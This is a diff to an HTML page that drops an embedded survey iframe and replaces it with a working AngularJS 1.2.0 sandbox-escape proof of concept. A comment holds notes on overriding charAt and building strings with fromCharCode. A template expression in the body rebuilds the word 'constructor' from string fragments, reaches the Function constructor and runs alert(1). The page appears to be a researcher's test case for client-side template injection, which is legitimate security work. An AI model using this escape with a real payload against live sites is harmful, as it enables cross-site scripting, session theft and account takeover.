@@ -1,11 +1,46 @@
-<!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html>
 <head>
-  <meta charset="utf-8">
-  <title>Tes</title>
+<meta charset="utf-8">
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.js"></script>
 </head>
-
 <body>
-<iframe src=https://webapp.kaiza.la/assets/actionboot.html?p=../../OutOfBoxMiniApps/1_1_20_0315_184215/Survey/SurveySummary.html&vid=0859ee6c-6e62-4235-bb3a-8b163d3a0b38&o=https://webapp.kaiza.la&d=kaiza.la></iframe>
+<!--
+    'a'.constructor.prototype.charAt=[].join;
+    $eval('x=alert(1)')
+
+    '' => ([]+[])
+    or '' => [].toString()
+    'foobar' + ([]+[]).constructor.fromCharCode(120,61)...
+
+({}.toString()).constructor.prototype.charAt=[].join;
+ $eval(({}.toString()).constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41))
+
+x=toString();
+x=x.split([]);
+x+''
+[object Object]
+constructor
+-->
+<div ng-app>
+{{
+c=[];
+o=toString();
+t=o.anchor(true);
+f=o.anchor(false);
+c.push(o[5]);
+c.push(o[1]);
+c.push(t[3]);
+c.push(f[12]);
+c.push(t[9]);
+c.push(t[10]);
+c.push(t[11]);
+c.push(o[5]);
+c.push(t[9]);
+c.push(o[1]);
+c.push(t[10]);
+a=c.join([]);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[c.join([])].fromCharCode(97,108,101,114,116,40,49,41))()
+
+}}
+</div>
 </body>
 </html>
